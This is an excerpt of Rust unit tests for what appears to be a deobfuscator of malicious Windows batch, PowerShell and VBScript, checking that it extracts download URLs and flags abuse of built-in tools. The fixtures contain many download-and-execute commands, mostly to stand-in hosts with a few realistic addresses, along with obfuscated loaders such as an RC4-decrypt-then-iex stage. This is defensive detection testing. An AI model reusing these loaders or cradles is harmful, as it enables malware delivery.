        assert!(
            !env.iter_output.contains("echo got=hello"),
            "backticks without usebackq should not run as a pipeline:\n{}",
            env.iter_output
        );
    }
    ...
    #[test]
    fn for_f_runtime_only_variables_stay_visible_in_mixed_case() {
        let script = br#"for /F %%A in ("%ErRoRlEvEl%") do echo got=%%A"#;
        let report = analyze(script, &Config::default());
        assert!(
            report.deobfuscated.contains("%ErRoRlEvEl%"),
            "runtime-only variable was dropped:\n{}",
            report.deobfuscated
        );
    }

    #[test]
    fn plain_for_preserves_quoted_set_items_with_spaces() {
        let script = br#"for %%A in ("alpha beta" gamma) do echo got=%%A"#;
        let report = analyze(script, &Config::default());
        assert!(
            report.deobfuscated.contains("echo got=alpha beta")
                && report.deobfuscated.contains("echo got=gamma"),
            "got:\n{}",
            report.deobfuscated
        );
    }
...
mod synth_tests {
    ...
    #[test]
    fn synth_find_case_insensitive() {
        let mut env = Environment::new(&Config::default());
        env.set("ALPHA", "hello");
        env.set("BETA", "world");
        let lines = run_pipeline("SeT | FiNd /i AlPhA", &mut env);
        assert!(
            lines
                .iter()
                .any(|l| l.to_ascii_lowercase().contains("alpha")),
    ...
    #[test]
    fn synth_findstr_reads_case_insensitive_file_source() {
        let mut env = Environment::new(&Config::default());
        env.set("PATHX", "value1");
        env.set("OTHER", "value2");
        env.modified_filesystem.insert(
            r"c:\temp\filter.bat".to_string(),
            crate::env::FsEntry::Content {
                content: b"PATHX=from-file\nOTHER=skip\n".to_vec(),
                append: false,
            },
        );
        let lines = run_pipeline(r#"findstr PATHX C:\temp\filter.BAT"#, &mut env);
        assert_eq!(lines, vec!["PATHX=from-file"]);
    }
...
"#;
    ...
    fn synth_set_preserves_windir_casing() {
        ...
        let lines = run_pipeline("set", &mut env);
        assert!(
            lines.iter().any(|l| l.starts_with("WINDIR=")),
            "expected WINDIR casing in: {:?}",
            lines
        );
    }

    #[test]
    fn synth_set_sorts_case_insensitively() {
        let mut env = Environment::new(&Config::default());
        env.set("qbeta", "2");
        env.set("QALPHA", "1");
        env.set("qgamma", "3");
        let lines = run_pipeline("SeT q", &mut env);
        let keys: Vec<&str> = lines
            .iter()
            .filter_map(|line| line.split_once('=').map(|(key, _)| key))
            .collect();
        assert_eq!(keys, vec!["qalpha", "qbeta", "qgamma"]);
    }

    #[test]
    fn synth_quoted_exe_path_dispatches() {
        let mut env = Environment::new(&Config::default());
        env.set("COMPUTERNAME", "LABHOST");
        let lines = run_pipeline(
            r#""C:\Windows\System32\WindowsPowerShell\v1.0\PoWeRsHeLl.ExE" -Command "[System.Net.Dns]::GetHostName()""#,
            &mut env,
        );
        assert!(
            lines.iter().any(|l| l == "LABHOST"),
            "quoted exe path did not dispatch: {:?}",
            lines
        );
    }
    ...
    #[test]
    fn synth_find_reads_tracked_file_argument() {
        let mut env = Environment::new(&Config::default());
        env.modified_filesystem.insert(
            "web.txt".to_string(),
            FsEntry::Content {
                content: b"noise\r\nhttps://find-file.example/payload.exe\r\n".to_vec(),
                append: false,
            },
        );

        let lines = run_pipeline(r#"find "https://" web.txt"#, &mut env);

        assert_eq!(lines, vec!["https://find-file.example/payload.exe"]);
    }
    ...
    fn synth_sort_reads_tracked_file_argument() {
        ...
        env.modified_filesystem.insert(
            "urls.txt".to_string(),
            FsEntry::Content {
                content: b"zeta\r\nhttps://sort-file.example/payload.exe\r\nalpha\r\n".to_vec(),
                append: false,
            },
        );

        let lines = run_pipeline("sort urls.txt", &mut env);
...
mod certutil_tests {
    ...
    fn certutil_decode_skips_optional_force_flag() {
        ...
        assert!(
            has,
            "no resolved CertutilDecode after -f flag: {:?}",
            env.traits
        );
        if let Some(FsEntry::Decoded { content, .. }) = env.modified_filesystem.get("dst.bin") {
            assert_eq!(&content[..], payload.as_bytes());
    ...
    fn certutil_decode_accepts_mixed_case_flags() {
        ...
        assert!(
            has,
            "no CertutilDecode trait for mixed-case flags: {:?}",
            env.traits
        );
        if let Some(FsEntry::Decoded { content, .. }) = env.modified_filesystem.get("dst.bin") {
            assert_eq!(&content[..], payload.as_bytes());
            ...
            panic!(
                "dst.bin not Decoded for mixed-case flags: {:?}",
                env.modified_filesystem.get("dst.bin")
            );
        }
    }
    ...
    #[test]
    fn certutil_urlcache_accepts_single_quoted_url_and_output() {
        let mut env = Environment::new(&Config::default());
        interpret_line(
            r#"certutil -urlcache -split -f 'http://x/y.exe' 'out.exe'"#,
            &mut env,
        );
        let has = env.traits.iter().any(|t| {
            matches!(t,
        ...
        assert!(
            has,
            "no CertutilDownload trait for single-quoted args: {:?}",
            env.traits
        );
        assert!(env.modified_filesystem.contains_key("out.exe"));
    }
...
robocopy C:\Work C:\Temp
call C:\Temp\original.js"#,
            &Config::default(),
        );
        assert!(
            report.traits.iter().any(|t| {
                matches!(t, Trait::Download { src, .. } if src == "https://robocopy-default-dir.example/payload")
            }),
            "bare robocopy copied generated JS content was not analyzed: {:?}",
            report.traits
        );
    }
        ...
        assert!(
            report.traits.iter().any(|t| {
                matches!(
                    t,
                    Trait::Download { src, .. }
                        if src == "https://robocopy-slash-dir.example/payload"
                )
            }),
        ...
        assert!(
            report.traits.iter().any(|t| {
                matches!(
                    t,
                    Trait::Download { src, .. }
                        if src == "https://replace-slash-dir.example/payload"
                )
            }),
...
mod wmic_tests {
    ...
    #[test]
    fn wmic_process_call_create_extracts_unquoted_inner() {
        let mut env = Environment::new(&Config::default());
        interpret_line(r#"wmic process call create cmd /c echo hi"#, &mut env);
        let has = env.traits.iter().any(|t| {
            matches!(t,
...
mod cscript_tests {
    ...
    fn cscript_with_vbs_content_extracts_payload() {
        ...
        interpret_line(r#"cscript //nologo "dropper.vbs.""#, &mut env);
        let has = env
            .traits
            .iter()
    ...
    #[test]
    fn cscript_with_single_quoted_vbs_content_extracts_payload() {
        let mut env = Environment::new(&Config::default());
        let vbs_content = b"WScript.Echo \"hi\"\r\n".to_vec();
        env.modified_filesystem.insert(
            "dropper.vbs".to_string(),
        ...
        assert!(
            has,
            "no CscriptExec for single-quoted path: {:?}",
            env.traits
        );
        assert!(
            env.exec_vbs.iter().any(|c| c == &vbs_content),
            "vbs not extracted from single-quoted path"
        );
    }
        ...
        let has = env.traits.iter().any(|t| {
            matches!(
                ...
                Trait::Extrac32 {
                    ...
                    dst,
                    self_reference: true,
                } if src == "C:\\Users\\al\\Downloads\\script.bat" && dst == "%temp%\\dropped.exe"
            )
        });
        assert!(
            has,
            "no normalized Extrac32 trait for single quotes: {:?}",
            env.traits
        );
    }
        ...
        assert!(
            report.traits.iter().any(|t| {
                matches!(
                    t,
                    Trait::Download { src, .. }
                        if src == "https://esentutl-copy-js.example/payload"
                )
            }),
        ...
        assert!(
            report.traits.iter().any(|t| {
                matches!(
                    t,
                    Trait::Download { src, .. }
                        if src == "https://esentutl-dir-js.example/payload"
                )
            }),
        ...
        assert!(
            !report.traits.iter().any(|t| {
                matches!(
                    t,
                    Trait::Download { src, .. }
                        if src == "https://esentutl-wrong-basename.example/payload"
                )
            }),
...
mod tokenizer_misc_tests {
    ...
    #[test]
    fn quoted_path_token_strips_outer_quotes() {
        assert_eq!(
            command_name(r#""C:\Temp\foo.vbs""#).as_deref(),
            Some("C:\\Temp\\foo.vbs")
        );
    }
}
...
mod ps1_url_extraction_tests {
    ...
    #[test]
    fn curl_exe_output_equals_preserves_destination() {
        let ps = r#"curl.exe "https://curl-output-equals.example/drop.exe" --output="C:\Users\Public\equals.exe""#;
        let script = format!("powershell -EncodedCommand {}\r\n", encode(ps));
        let report = analyze(script.as_bytes(), &Config::default());
        let has = report.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, dst, .. }
                    if src == "https://curl-output-equals.example/drop.exe"
                        && dst.as_deref() == Some("C:\\Users\\Public\\equals.exe")
            )
        });
        assert!(
            has,
        ...
        assert!(
            !report.traits.iter().any(|t| {
                matches!(
                    t,
                    Trait::Download { src, .. }
                        if src == "https://ps-short-header.example/landing"
                )
            }),
    ...
    #[test]
    fn downloadstring_trailing_punctuation_is_trimmed() {
        let ps = r#"$wc = New-Object Net.WebClient; $wc.DownloadString('https://evil.example/payload.ps1)')"#;
        let script = format!("powershell -Command \"{}\"\r\n", ps);
        let report = analyze(script.as_bytes(), &Config::default());
        let has = report.traits.iter().any(|t| {
            matches!(
                t,
                Trait::Download { src, .. } if src == "https://evil.example/payload.ps1"
            )
        });
        assert!(
            has,
            "DownloadString trailing punctuation was not trimmed: {:?}",
            report.traits
        );
    }
...
"#;
    ...
    #[test]
    fn webclient_downloadfile_literal_destination_extracted() {
        let ps = r#"$wc = New-Object Net.WebClient; $wc.DownloadFile('https://downloadfile-dst.example/tool.exe','C:\Users\Public\tool.exe')"#;
        let script = format!("powershell -EncodedCommand {}\r\n", encode(ps));
        let report = analyze(script.as_bytes(), &Config::default());
        let has = report.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, dst, .. }
                    if src == "https://downloadfile-dst.example/tool.exe"
                        && dst.as_deref() == Some("C:\\Users\\Public\\tool.exe")
            )
        });
        assert!(
            has,
            "no DownloadFile destination from literal second argument: {:?}",
            report.traits
        );
    }
...
mod ps1_obfuscation_tests {
    ...
    fn hex_filler(count: usize) -> String {
        ...
        for n in 0..count {
            write!(&mut out, "{n:04x}").expect("write to String");
        }
        out
    }
    ...
    #[test]
    fn ps1_normalization_does_not_inline_binary_base64_literal() {
        use base64::Engine;

        let mut binary = b"MZ\x00\x01\x02\x03".to_vec();
        binary.extend((0..=255).cycle().take(2048));
        ...
        assert!(
            ...
            "binary base64 decode call should be preserved:\n{}",
            normalized
        );
        assert!(
            !normalized.contains("\\x00\\x01\\x02\\x03"),
            "binary base64 should not be inlined as escaped text:\n{}",
            normalized
        );
    }
    ...
    #[test]
    fn ps1_normalization_does_not_duplicate_large_decoded_stage_variable() {
        let filler = hex_filler(20_000);
        let stage = format!("Invoke-WebRequest -Uri https://large-stage.example/a\r\n# {filler}");
        let ps = format!("$stage = '{}'; iex $stage", stage.replace('\'', "''"));
        let normalized = crate::ps1_scan::normalize_ps1_text(&ps);
        assert!(
            normalized.contains("https://large-stage.example/a"),
            "large stage assignment should remain visible:\n{}",
            normalized
        );
        assert_eq!(
            normalized.matches("https://large-stage.example/a").count(),
            1,
            "large stage should not be duplicated by variable substitution:\n{}",
            normalized
        );
    }
...
"#
    ...
    #[test]
    fn ps1_normalization_decodes_for_substring_stride_function_with_unicode_carrier() {
        fn stride_carrier(decoded: &str, start: usize, step: usize) -> String {
            let len = start + decoded.chars().count() * step;
            let mut chars = vec!['x'; len];
            for (idx, c) in decoded.chars().enumerate() {
        ...
        let decoded = "héllo";
        let carrier = stride_carrier(decoded, 1, 2);
        let ps = format!(
            "Function Amphiptere($Baylor19){{For($Masselgem=1;$Masselgem -lt $Baylor19.Length;$Masselgem+=2){{$out+=$Baylor19.'su'.'Invoke'($Masselgem,1);}}$out}};$x=Amphiptere '{carrier}'"
        );
        let normalized = crate::ps1_scan::normalize_ps1_text(&ps);
        assert!(
            normalized.contains(decoded),
            "for/Substring stride payload with unicode carrier not decoded:\n{}",
            normalized
        );
    }
    ...
    fn ps1_normalization_decodes_for_index_stride_function() {
        ...
        let decoded = "https://stride-index.example/payload.exe";
        let carrier = stride_carrier(decoded, 4, 5);
        let ps = format!(
            "function decode($s){{If ($host.UI) {{$noise++;}}for($i=4;$i -lt $s.Length;$i+=5){{$out+=$s[$i];}}$out}};$url=decode '{carrier}'"
        );
        let normalized = crate::ps1_scan::normalize_ps1_text(&ps);
        assert!(
            normalized.contains(decoded),
    ...
    #[test]
    fn ps1_normalization_decodes_variable_substring_stride_function() {
        fn stride_carrier(decoded: &str, start: usize, step: usize) -> String {
            let len = start + decoded.chars().count() * step;
            let mut chars = vec!['x'; len];
            for (idx, c) in decoded.chars().enumerate() {
        ...
        let decoded = "http://87.121.105.163/Sylvester.dwp";
        let carrier = stride_carrier(decoded, 4, 5);
        let ps = format!(
            "$m='S';$m+='ubstrin';$m+='g';function cut($s){{for($i=4;$i -lt $s.Length;$i+=(5)){{$out+=$s.$m.Invoke($i,1);}}$out}};$url=cut '{carrier}'"
        );
        let normalized = crate::ps1_scan::normalize_ps1_text(&ps);
        assert!(
            normalized.contains(decoded),
            "variable Substring stride payload not decoded:\n{}",
            normalized
        );
    }
    ...
    #[test]
    fn ps1_normalization_decodes_spaced_char_array_concat_directly() {
        let ps = "Invoke-WebRequest -Uri ([char[]]@( 104, 116, 116, 112 )-join '')";
        let normalized = crate::ps1_scan::normalize_ps1_text(ps);
        assert!(
            normalized.contains("'http'"),
            "spaced char-array concat not decoded:\n{}",
            normalized
        );
    }
    ...
    #[test]
    fn ps1_normalization_inlines_call_operator_variable_invoke_expression_wrapper() {
        let ps = concat!(
            "$cmd='Invoke-Expression';",
            "(New-Item -Path function: -Name RunIt -Value { param ($x); & ($cmd) ($x) });",
            "RunIt ('$global:stage=''ok''')"
        ...
        assert!(
            normalized.contains("$global:stage='ok'"),
            "call-operator Invoke-Expression wrapper call was not inlined:\n{}",
            normalized
        );
    }

    #[test]
    fn ps1_normalization_rewrites_generic_call_operator_wrapper_to_target() {
        let ps = concat!(
            "$cmd='IeV';",
            "(New-Item -Path function: -Name RunIt -Value { param ($x); & ($cmd) ($x) });",
            "rUnIt ('abc')"
        ...
        let normalized = crate::ps1_scan::normalize_ps1_text(ps);
        assert!(
            normalized.contains("IeV ('abc')"),
            "generic call-operator wrapper was not rewritten to its literal target:\n{}",
            normalized
        );
    }
...
"#,
    ...
    #[test]
    fn ps1_rc4_wrapper_stage_is_decoded_and_recursed() {
        use base64::Engine;
...
$b64DecodeFunc = {{
    ...
    [System.Convert]::FromBase64String($dataString)
}}
$encBytes = & $b64DecodeFunc $rc4EncData
$keyBytes = & $b64DecodeFunc $rc4KeyB64
$rc4Decrypt = {{
    param(
        [byte[]]$cipherData,
        [byte[]]$decryptKey
    )
    $sArray = New-Object int[] 256
    $kArray = New-Object byte[] 256
    for ($iIndex = 0; $iIndex -lt 256; $iIndex++) {{
        $sArray[$iIndex] = $iIndex
        $kArray[$iIndex] = $decryptKey[$iIndex % $decryptKey.Length]
    }}
    $jVar = 0
    for ($iIndex = 0; $iIndex -lt 256; $iIndex++) {{
        $jVar = ($jVar + $sArray[$iIndex] + $kArray[$iIndex]) % 256
        $tempVal = $sArray[$iIndex]
        $sArray[$iIndex] = $sArray[$jVar]
        $sArray[$jVar] = $tempVal
    }}
    $outputBytes = New-Object byte[] $cipherData.Length
    $xVar = 0
    $yVar = 0
    for ($iIndex = 0; $iIndex -lt $cipherData.Length; $iIndex++) {{
        $xVar = ($xVar + 1) % 256
        $yVar = ($yVar + $sArray[$xVar]) % 256
        $tempVal = $sArray[$xVar]
        $sArray[$xVar] = $sArray[$yVar]
        $sArray[$yVar] = $tempVal
        $tVal = ($sArray[$xVar] + $sArray[$yVar]) % 256
        $outputBytes[$iIndex] = [byte]($cipherData[$iIndex] -bxor $sArray[$tVal])
    }}
    return $outputBytes
}}
$mainDecrypt = {{
    ...
    $outputBytes = & $rc4Decrypt -cipherData $encBytes -decryptKey $keyBytes
    if ($outputBytes -ne $null) {{
        return [System.Text.Encoding]::UTF8.GetString($outputBytes)
    }}
    return $null
}}
$finalScript = & $mainDecrypt -encBytes $encBytes -keyBytes $keyBytes
if ($finalScript -ne $null) {{
    iex $finalScript
}}
"#
        );
        ...
        assert!(
            report
                .traits
                .iter()
                .any(|t| matches!(t, Trait::Download { src, .. } if src == "https://rc4.example/stage.ps1")),
            "RC4 wrapper stage was not decoded and recursed:\n{:?}",
            report.traits
        );
    }
...
mod vbs_url_extraction_tests {
    ...
    #[test]
    fn vbs_xmlhttp_url_extracted_with_mixed_case_open() {
        let mut env = Environment::new(&Config::default());
        let vbs = b"Set http = CreateObject(\"MSXML2.XMLHTTP\")\r\nhttp.oPeN \"GET\", \"http://evil.vbs/mixed.exe\", False\r\nhttp.Send";
        env.all_extracted_vbs.push(vbs.to_vec());
        crate::vbs_scan::scan_vbs_payloads(&mut env);
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src.contains("evil.vbs/mixed.exe")
            )
        });
        assert!(has, "mixed-case open missed: {:?}", env.traits);
    }

    #[test]
    fn vbs_execute_recovers_nested_xmlhttp_url() {
        let mut env = Environment::new(&Config::default());
        let vbs = br#"eXeCuTe "Dim u, http" & Chr(13) & Chr(10) & "u = ""http://vbs-execute.example/payload.txt""" & Chr(13) & Chr(10) & "Set http = CreateObject(""MSXML2.XMLHTTP"")" & Chr(13) & Chr(10) & "http.Open ""GET"", u, False" & Chr(13) & Chr(10) & "http.Send""#;
        env.all_extracted_vbs.push(vbs.to_vec());
        crate::vbs_scan::scan_vbs_payloads(&mut env);
        let has = env.traits.iter().any(|t| {
            matches!(t,
        ...
        assert!(
            has,
            "nested Execute VBS URL was not extracted: {:?}",
            env.traits
        );
    }
...
http.Send"#;
    ...
    fn vbs_urldownloadtofile_url_extracted_from_variable() {
        let mut env = Environment::new(&Config::default());
        let vbs = br#"Dim u
u = "http://vbs-urlmon.example/payload.exe"
URLDownloadToFile 0, u, "C:\Users\Public\payload.exe", 0, 0"#;
        env.all_extracted_vbs.push(vbs.to_vec());
        crate::vbs_scan::scan_vbs_payloads(&mut env);
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, dst, .. }
                    if src == "http://vbs-urlmon.example/payload.exe"
                        && dst.as_deref() == Some("C:\\Users\\Public\\payload.exe")
            )
        });
        assert!(
            has,
            "no Download trait with destination from URLDownloadToFile variable URL: {:?}",
            env.traits
        );
    }
...
stream.SaveToFile out, 2"#;
    ...
    #[test]
    fn vbs_shell_run_expression_emits_url_launch() {
        let mut env = Environment::new(&Config::default());
        let vbs = br#"Set sh = CreateObject("WScript.Shell")
sh.Run "ht" & "tps://vbs-run.example/panel", 0, False"#;
        env.all_extracted_vbs.push(vbs.to_vec());
        crate::vbs_scan::scan_vbs_payloads(&mut env);
        ...
        assert!(
            env.traits.iter().any(|t| matches!(
                t,
                Trait::UrlLaunch { url, .. } if url == "https://vbs-run.example/panel"
            )),
            "WScript.Shell.Run did not emit UrlLaunch: {:?}",
            env.traits
        );
    }
...
http.Send"#;
    ...
    fn vbs_xmlhttp_url_extracted_from_inline_concat_argument() {
        ...
        let vbs = br#"Dim http
Set http = CreateObject("MSXML2.XMLHTTP")
http.Open "GET", "ht" & "tp://vbs-inline-concat.example/payload.txt", False
http.Send"#;
        env.all_extracted_vbs.push(vbs.to_vec());
        crate::vbs_scan::scan_vbs_payloads(&mut env);
        let has = env.traits.iter().any(|t| {
        ...
        assert!(
            has,
            "no Download trait from VBS inline concatenated URL: {:?}",
            env.traits
        );
    }
...
http.Send"#;
    ...
    #[test]
    fn vbs_xmlhttp_url_extracted_from_mixed_case_chr_concat_variable() {
        let mut env = Environment::new(&Config::default());
        let vbs = br#"Dim u, http
u = cHr(104) & "ttp://vbs-chr-mixed.example/payload.txt"
Set http = CreateObject("MSXML2.XMLHTTP")
http.Open "GET", u, False
http.Send"#;
        env.all_extracted_vbs.push(vbs.to_vec());
        ...
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "http://vbs-chr-mixed.example/payload.txt"
            )
        });
        assert!(
            has,
            "no Download trait from mixed-case VBS Chr concatenated URL: {:?}",
            env.traits
        );
    }
...
http.Send"#;
    ...
    #[test]
    fn vbs_xmlhttp_url_extracted_from_mixed_case_cstr_wrapper() {
        let mut env = Environment::new(&Config::default());
        let vbs = br#"Dim u, http
u = cStR("http://vbs-cstr-mixed.example/payload.txt")
Set http = CreateObject("MSXML2.XMLHTTP")
http.Open "GET", u, False
http.Send"#;
        env.all_extracted_vbs.push(vbs.to_vec());
        ...
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "http://vbs-cstr-mixed.example/payload.txt"
            )
        });
        assert!(
            has,
            "no Download trait from mixed-case VBS CStr wrapper: {:?}",
            env.traits
        );
    }
...
http.Send"#;
    ...
    fn vbs_xmlhttp_url_extracted_from_join_split_wrapper() {
        let mut env = Environment::new(&Config::default());
        let vbs = br#"Dim u, http
u = Join(Split("http://|vbs-join-split.example|/payload.txt", "|"), "")
Set http = CreateObject("MSXML2.XMLHTTP")
http.Open "GET", u, False"#;
        env.all_extracted_vbs.push(vbs.to_vec());
        crate::vbs_scan::scan_vbs_payloads(&mut env);
...
http.Send"#;
    ...
    #[test]
    fn vbs_xmlhttp_url_extracted_from_mixed_case_split_index_wrapper() {
        let mut env = Environment::new(&Config::default());
        let vbs = br#"Dim u, http
u = sPlIt("http://vbs-split-mixed.example/payload.txt|trash", "|")(0)
Set http = CreateObject("MSXML2.XMLHTTP")
http.Open "GET", u, False
http.Send"#;
        env.all_extracted_vbs.push(vbs.to_vec());
        ...
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "http://vbs-split-mixed.example/payload.txt"
            )
        });
        assert!(
            has,
            "no Download trait from mixed-case VBS Split(...)(0) URL: {:?}",
            env.traits
        );
    }
...
http.Send"#;
        ...
        assert!(
            report.deobfuscated.to_lowercase().contains("createobject")
                && !report.deobfuscated.contains('\0'),
...
mshta "renamed.hta""#,
    ...
    #[test]
    fn xcopy_exe_pipeline_preserves_download_source_for_later_execution() {
        let report = crate::analyze(
            br#"curl -o original.hta https://xcopy-exe-pipe.example/payload.hta
echo F | xcopy.exe /y original.hta renamed.hta
mshta renamed.hta"#,
            &Config::default(),
        );
        assert!(
            report.traits.iter().any(|t| {
                matches!(
                    ...
                    crate::traits::Trait::UrlArgument { cmd, url }
                        if cmd == "mshta renamed.hta"
                            && url == "https://xcopy-exe-pipe.example/payload.hta"
                )
            }),
            "xcopy.exe pipeline copied download was not linked on later execution: {:?}",
            report.traits
        );
    }
            ...
            report.traits.iter().any(|t| {
                matches!(
                    ...
                    crate::traits::Trait::Download { src, .. }
                        if src == "https://xcopy-dir-js.example/payload"
                )
            }),
        ...
        assert!(
            report.traits.iter().any(|t| {
                matches!(
                    t,
                    crate::traits::Trait::Download { src, .. }
                        if src == "https://xcopy-i-dir-hint.example/payload"
                )
            }),
            "xcopy /i directory hint did not preserve generated JS content: {:?}",
            report.traits
        );
    }
...
call C:/Temp/original.js"#,
        ...
        assert!(
            report.traits.iter().any(|t| {
                matches!(t, crate::traits::Trait::Download { src, .. } if src == "https://copy-slash-tracked-dir.example/payload")
            }),
...
call C:\Temp\original.js"#,
        ...
        assert!(
            report.traits.iter().any(|t| {
                matches!(t, crate::traits::Trait::Download { src, .. } if src == "https://copy-wildcard-dir.example/payload")
            }),
...
call C:\Temp\original.js"#,
        ...
        assert!(
            report.traits.iter().any(|t| {
                matches!(t, crate::traits::Trait::Download { src, .. } if src == "https://xcopy-wildcard-dir.example/payload")
            }),
        ...
        let download_count = report
            ...
            .filter(|t| {
                matches!(
                    t,
                    Trait::Download { src, cmd, dst: None }
                        if cmd.eq_ignore_ascii_case("mshta \"hTtPs://hta.example/payload.hta\"")
                            && src == "https://hta.example/payload.hta"
                )
            })
            .count();
        let sweep_count = report
...
$stageUrl = "ps-schemeless.example/stage.zip""#,
    ...
    #[test]
    fn process_url_argument_with_trailing_dot_path_is_typed() {
        let mut env = crate::env::Environment::new(&Config::default());
        let url = "https://skynetx.com.br/html.html";
        crate::deob_scan::scan_deob_text(
            &format!(r#"(C:\Users\Public\calc.COM. "{url}")"#),
        ...
        assert!(
            has,
            "trailing-dot process URL argument not typed: {:?}",
            env.traits
        );
    }
    ...
    fn msiexec_attached_administrative_install_url_in_deob_text_emits_typed_trait() {
        ...
        let line = format!(r#"msiexec /quiet /a{url}"#);
        crate::deob_scan::scan_deob_text(&line, &mut env);
    ...
    fn msiexec_administrative_install_url_emits_typed_trait() {
        ...
        assert!(
            env.traits.iter().any(|t| {
                matches!(
                    t,
                    Trait::Lolbas { name, cmd } if name == "msiexec" && cmd.contains("/a")
                )
            }),
...
ftp -n -s:ftp.txt"#,
    ...
    fn ftp_current_dir_script_file_emits_remote_connect_and_download() {
        ...
        crate::interp::interpret_line(r"ftp -n -s:.\ftp.txt", &mut env);
...
"#;
    ...
    fn bitsadmin_addfile_in_deob_text_emits_structured_download() {
        let mut env = crate::env::Environment::new(&Config::default());
        crate::deob_scan::scan_deob_text(
            r#"bitsadmin /create j1 & bitsadmin /addfile j1 https://bits-addfile-scan.example/a.txt C:\Temp\a.exe"#,
            &mut env,
        );
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::BitsadminDownload { url, dst }
                    if url == "https://bits-addfile-scan.example/a.txt" && dst == "C:\\Temp\\a.exe"
            )
        });
        assert!(
            has,
        ...
        let generic_count = env
            .traits
            .iter()
            .filter(|t| matches!(t, Trait::DownloadInDeobText { src, .. } if src.contains("bits-addfile-scan.example")))
            .count();
        assert_eq!(
            generic_count, 0,
    ...
    fn python_b64decode_literal_recurses_into_decoded_source_urls() {
        ...
        let decoded = "import urllib.request;import base64;exec(base64.b64decode(urllib.request.urlopen('https://py.example/inner').read().decode('utf-8')))";
        let b64 = base64::engine::general_purpose::STANDARD.encode(decoded.as_bytes());
        let mut env = crate::env::Environment::new(&Config::default());
        crate::deob_scan::scan_deob_text(
    ...
    fn deob_text_var_substring_assembled_url_uses_local_set_bindings() {
        ...
        crate::deob_scan::scan_deob_text(
            r#"set "scheme=https"
set "host=github.com"
set "path=owner/repo/raw/main/up.png"
powershell -Command "(New-Object Net.WebClient).DownloadFile('%scheme:~0,5%://%host:~0,10%/%path:~0,26%', 'C:\Users\Public\up.bat')""#,
            &mut env,
        );
        assert!(
            env.traits.iter().any(|t| {
            ...
            "assembled URL not scanned from local set bindings: {:?}",
            env.traits
        );
    }
...
start /min powershell.exe -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; (New-Object Net.WebClient).DownloadFile('%方案:~0,5%://%主机:~0,10%/%路径:~0,26%', '%APPDATA%\up.bat');""#,
    ...
    #[test]
    fn deob_text_var_substring_assembled_url_rouki_table_regression() {
        let mut env = crate::env::Environment::new(&Config::default());
        crate::deob_scan::scan_deob_text(
            r#"set "豆维耻贝==npkrjDF6uOQfbK45s9VoJcZwxiLzR8NP3XdCMeSA0U@YITg7EWhtalGBHqyvm1 2"
@set "尔克克尔=kedJLEgYVF=i950l@4mr1RXNAQqBhscTvzZjUfCPGDIpOt6KHSywW 8o3xu2banM7"
@set "贝艾德克=LW381yJZshw4Paz VofX6EDmRpg=THYv5GOMuAn02UrKd7btIQkc@iexCFlBS9qjN"
@set "德德耻克=9F6CUvQLkyXjgadPiZO7lmVAcqxKep1HMGwtIRrbSB @84W5nuEN=hfszo0Y2TJ3D"
@set "饿豆饿阿=OwQsvTIL W6F843gNPfhbA1XDUeYayR=GlEBH9Skrjp@iomtunzqCZdM50KJVx7c2"
powershell -Command "x('%尔克克尔:~28,1%%德德耻克:~35,1%%尔克克尔:~45,1%%德德耻克:~29,1%%饿豆饿阿:~3,1%://%饿豆饿阿:~15,1%%豆维耻贝:~26,1%%贝艾德克:~47,1%%饿豆饿阿:~19,1%%德德耻克:~49,1%%豆维耻贝:~13,1%.%饿豆饿阿:~63,1%%饿豆饿阿:~45,1%%尔克克尔:~18,1%/%饿豆饿阿:~54,1%-%德德耻克:~21,1%%尔克克尔:~20,1%-%饿豆饿阿:~22,1%/%饿豆饿阿:~47,1%%尔克克尔:~20,1%-%尔克克尔:~59,1%%德德耻克:~60,1%%饿豆饿阿:~10,1%/%尔克克尔:~19,1%%尔克克尔:~61,1%%饿豆饿阿:~1,1%/%饿豆饿阿:~46,1%%豆维耻贝:~53,1%%尔克克尔:~11,1%%贝艾德克:~38,1%/%豆维耻贝:~9,1%%德德耻克:~29,1%.%贝艾德克:~25,1%%豆维耻贝:~1,1%%饿豆饿阿:~15,1%', 'x')""#,
            &mut env,
        );
        assert!(
            env.traits.iter().any(|t| {
                matches!(
                    t,
                    Trait::DownloadInDeobText { src, line_hint }
                        if src == "https://github.com/d-m1-1/t1-226/raw/main/up.png"
                            && line_hint == "resolved-deob-var-fragments"
                )
            }),
            "Rouki assembled URL not scanned: {:?}",
            env.traits
        );
    }
...
powershll.exe -mmand"(Nw-ject-ypame Sstem.Net.Welint).Dwnloadile('https://raw.example/stage.zip','b.zip')""#,
    ...
    #[test]
    fn echoed_vbs_xmlhttp_skips_preexisting_download_duplicate() {
        let mut env = crate::env::Environment::new(&Config::default());
        let url = "https://echo-vbs.example/payload.txt";
        env.all_extracted_vbs.push(
            br#"Set http = CreateObject("MSXML2.XMLHTTP")
http.open "GET", "https://echo-vbs.example/payload.txt", False
http.send
"#
            .to_vec(),
        );
        ...
        assert_eq!(
            download_count, 1,
            "echoed VBS duplicated a preexisting download: {:?}",
            env.traits
        );
    }

    #[test]
    fn echoed_vbs_xmlhttp_skips_duplicate_downloads_inside_payload() {
        let mut env = crate::env::Environment::new(&Config::default());
        let url = "https://echo-vbs.example/payload.txt";
        crate::deob_scan::scan_deob_text(
            "echo noncatalog = \"https://echo-vbs.example/payload.txt\"\r\necho Set http = CreateObject(\"MSXML2.XMLHTTP\")\r\necho http.open \"GET\", noncatalog, False\r\necho http.send\r\necho http.open \"GET\", noncatalog, False\r\necho http.send\r\n",
        ...
        assert_eq!(
            download_count, 1,
            "echoed VBS duplicated a payload download: {:?}",
            env.traits
        );
    }
...
"#,
    ...
    #[test]
    fn copied_curl_alias_trailing_dot_exe_in_deob_text_emits_structured_download() {
        let mut env = crate::env::Environment::new(&Config::default());
        env.traits.push(Trait::WindowsUtilManip {
            cmd: "copy c:\\windows\\system32\\curl.exe. vjik.exe".to_string(),
            src: "c:\\windows\\system32\\curl.exe.".to_string(),
        ...
        crate::deob_scan::scan_deob_text(
